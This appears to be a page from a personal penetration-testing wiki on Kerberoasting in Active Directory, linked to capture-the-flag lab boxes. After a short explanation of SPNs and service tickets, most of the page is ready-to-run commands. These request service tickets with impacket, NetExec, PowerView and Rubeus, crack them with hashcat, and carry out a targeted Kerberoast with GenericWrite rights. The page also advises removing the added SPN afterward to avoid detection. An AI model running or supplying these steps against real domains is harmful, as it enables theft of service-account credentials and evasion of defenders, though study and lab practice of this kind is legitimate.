---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Kerberoasting

## Concept

{% hint style="info" %}
Typically, **Kerberoasting happens after compromising a domain user**. However, according to [new research](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/), it is possible to **perform this attack with an account susceptible to** [**ASREPRoast**](as-reproasting.md)! For an example of this attack vector check [Rebound](../../../boxes/insane/rebound.md#kerberoasting).
{% endhint %}

**Kerberoasting** is an attack on the **Service Ticket (ST)** and **Service Principal Names (SPNs)**. [SPNs](../recon.md#spns) are unique IDs that Kerberos uses to map a service instance, for example MySQL, to a service sign-in account, such as `svc_mysql`, in whose, often privileged, context the service is running. The ST is encrypted with the service's account NTLM hash, so it can potentially be cracked. **Any domain user can request a ST from the DC for any SPN account**.

> _Accounts like `krbtgt`, **computer accounts**, and **(g)MSAs** are usually resistant due to complex, long passwords._

<figure><img src="../../../.gitbook/assets/kerberoasting_process (1).png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Attack

> _For an example of Kerberoasting check_ [_Sizzle_](https://x7331.gitbook.io/boxes/boxes/insane/sizzle#path-to-victory) _(Rubeus) and_ [_Active_](https://x7331.gitbook.io/boxes/boxes/easy/active#eop-via-kerberoasting) _(NetExec)._

{% tabs %}
{% tab title="Linux" %}
Check if an account has an SPN:

```bash
# Confirm that the target account has SPN
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

If time sync errors occur, i.e., `KRB_AP_ERR_SKEW(Clock skew too great)`:

```bash
sudo ntpdate <dc-ip>
```

Kerberoast the target account:

{% code overflow="wrap" %}
```bash
# Kerberoast the target account with NetExec
nxc ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt

# Kerberoast the target account with impacket
impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN/user -request -outputfile spns.lst

# Kerberoast an account susceptible to ASREPRoasting with impacket
impacket-GetUserSPNs -no-preauth jjones -usersfile dom_users -dc-host 10.10.11.231 rebound.htb/ -outputfile kerb.txt
```
{% endcode %}

Crack the hashes:

{% code overflow="wrap" %}
```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
Check if an account has an SPN:

{% code overflow="wrap" %}
```powershell
# Enumerate Kerberoastable accounts with PowerView
Get-DomainUser * -SPN | select samaccountname

# Confirm that the target account has SPN with PowerView
Get-DomainUser 'sqldev' | Select serviceprincipalname

# Enumerate all user-linked SPNs and extract TGS-REP hashes with Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
{% endcode %}

Then we can proceed to Kerberoast the target account:

{% code overflow="wrap" %}
```powershell
# Kerberoast the enumerated accounts with PowerView
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

# Kerberoast the target account with PowerView
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Kerberoast the target account with Rubeus
.\Rubeus.exe kerberoast /creduser:domain\user1 /credpassword:pass /user:targetUser /outfile:hash.txt /format:hashcat /nowrap

# Kerberoast an account susceptible to ASREPRoasting with Rubeus
.\Rubeus.exe kerberoast /domain:<domain> /dc:<ip> /nopreauth:<user> /spns:<username-list>
```
{% endcode %}

Crack the hashes:

{% code overflow="wrap" %}
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

Optionally, we can clear the SPNs of the target account:

```powershell
# Clear the SPNs of the target account
Set-DomainObject -Identity sqldev -Clear serviceprincipalname
```
{% endtab %}
{% endtabs %}

## Targeted Kerberoast

If we have `GenericWrite` or `GenericAll` on a user object, we can set an SPN on that user account and then extract and crack the TGS. This attack can be performed with [`targetedKerberoast.py`](https://github.com/ShutdownRepo/targetedKerberoast).&#x20;

{% hint style="warning" %}
Remember to **clean up** by removing the SPN afterward to avoid detection!
{% endhint %}

```bash
targetedKerberoast.py -v -d <domain_FQDN> -u <user> -p <pass>
```

## Resources

* An amazing demonstration of Kerberoasting ([video](https://www.youtube.com/watch?v=-3MxoxdzFNI))
* What `impacket-GetUserSPNs` does behind the scenes ([video](https://www.youtube.com/watch?v=xH5T9-m9QXw))
* Siegecast's lecture on Kerberoasting ([video](https://www.youtube.com/watch?v=Jaa2LmZaNeU))
* An in-depth adsecurity article about Kerberoasting ([article](https://adsecurity.org/?p=3458))
